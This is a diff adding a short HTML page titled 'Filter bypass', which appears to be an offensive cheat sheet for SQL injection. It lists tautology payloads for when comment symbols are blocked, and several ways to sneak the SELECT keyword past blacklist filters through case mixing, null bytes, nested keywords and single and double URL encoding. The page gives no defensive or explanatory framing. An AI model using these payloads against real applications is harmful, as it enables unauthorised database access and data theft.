@@ -1,0 +1,17 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Filter bypass</title>
+</head><body><b>If comment symbol blocked don't use --</b><br/>
+<tt><br/>
+</tt><tt>AAA' or 1=1-- </tt>is equivalent to <tt>AAA' or 'a'='a</tt><br/>
+<br/>
+<b>If blacklist employed</b><br/>
+<tt><br/>
+</tt><tt>SELECT</tt>is equivalent<br/>
+<tt>SeLeCt</tt><br/>
+<tt>%00SELECT</tt><br/>
+<tt>SELSELECTECT</tt><br/>
+<tt>%53%45%4c%45%43%54</tt><br/>
+<tt>%2553%2545%254c%2545%2543%2554</tt><br/>
+</body></html>
